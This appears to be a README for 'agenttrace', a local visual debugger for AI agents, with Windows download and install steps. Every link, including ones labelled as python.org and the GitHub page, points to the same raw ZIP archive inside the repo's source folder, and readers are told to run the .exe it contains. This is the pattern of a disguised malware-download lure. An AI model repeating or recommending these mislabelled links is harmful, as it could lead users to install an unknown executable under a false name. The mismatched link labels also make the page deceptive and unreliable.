# 🕵️‍♂️ agenttrace - Visual Debugging for AI Agents

[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)

---

## 📋 What is agenttrace?

AgentTrace is a tool that helps you see what happens inside AI agents step-by-step. It works on your own computer without sending your data elsewhere. The tool comes with two parts:

- A Python SDK that tracks what the AI agent does.
- A web interface that shows this information as an interactive tree. You can explore each step, tool call, prompt, and response to understand how your AI works.

You do not need to know programming to use the web interface. It helps you see what the AI agent tries at every step.

---

## 💻 System Requirements

Before you start, make sure your computer meets these needs:

- Windows 10 or later operating system
- At least 4 GB of free RAM (8 GB is better)
- 500 MB free disk space
- Internet connection to download the application
- Web browser such as Chrome, Firefox, or Edge to view the UI
- Python 3.8 or later installed (required to use the SDK)

If you do not have Python installed, please get it from [python.org](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip) before continuing.

---

## 🚀 How to Download agenttrace

To get agenttrace on your Windows PC:

1. Click on the green **Download agenttrace** button below to visit the project page.  
   [![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)

2. On the GitHub page, look for the latest release or package files.

3. Download the installer or ZIP file for Windows if available.

4. Once downloaded, locate the file in your Downloads folder.

---

## 🛠️ Installation Steps

Follow these steps to install agenttrace:

1. **For Installer File** (e.g., `.exe`):
   - Double-click the downloaded `.exe` file.
   - Follow the setup prompts.
   - Choose the default options unless you want to change the install folder.
   - When the installer finishes, you can close it.

2. **For ZIP Archive**:
   - Right-click the ZIP file.
   - Select `Extract All...`.
   - Choose a folder where you want the files.
   - Open the extracted folder.

3. **Verify Installation**:
   - Open the Windows Start menu.
   - Find `agenttrace` in the list.
   - If it is not listed, you can open a Command Prompt and type:
     ```
     agenttrace --help
     ```
   - This should show some basic help text if installed correctly.

---

## ⚙️ Running agenttrace

Once installed, you can start the agenttrace application:

1. Open the application by clicking its Start menu icon or from the extracted folder.

2. The program may open a command window or launch the web UI directly.

3. The web UI runs on your local machine, usually accessible at:  
   `http://localhost:8000`

4. Open your web browser and go to that address.

5. Use the interface to load or start new AI agent runs. You can watch every step in detail.

---

## 🔧 Using the Python SDK (Optional)

If you want to trace your AI agent runs using Python:

1. Open a Command Prompt or PowerShell window.

2. Install the SDK by running this command:

   ```
   pip install agenttrace
   ```

3. Use the SDK to add tracing code in your AI projects. Example:

   ```python
   from agenttrace import TraceAgent

   agent = TraceAgent(...)
   agent.run()
   ```

4. After running your AI agent, open the web UI to inspect the results.

Make sure Python and pip are installed before these steps.

---

## 🧩 Features You Will Use

- **Step Debugging:** See what your AI agent does at each step.
- **Tool Calls:** Watch how external tools or APIs are called.
- **Prompt Inspection:** View the prompts sent to the AI.
- **Response Viewing:** Read and explore the AI’s answers or output.
- **Interactive Tree View:** Navigate an easy-to-use tree showing all activity.
- **Local Operation:** All data stays on your computer for privacy.
- **Lightweight UI:** Runs fast in modern browsers.

---

## ❓ Troubleshooting Tips

- If the application does not start, make sure Python is installed and your system meets the requirements.

- If the web UI at `http://localhost:8000` does not open, check if a firewall blocks the program.

- Restart your computer if you face issues after installation.

- To update agenttrace, download the latest release from the main page and install following the same steps.

---

## 📂 Where to Get Help

- Visit the GitHub page to read more details or report problems:  
  https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip

- Check the Issues tab there for known problems or questions.

- Look for a README or help files included with the download.

---

## 📥 Download agenttrace now

Click the button below to visit the agenttrace GitHub page and download:

[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://raw.githubusercontent.com/umairb0/agenttrace/main/backend/src/agent_trace/Software_3.8.zip)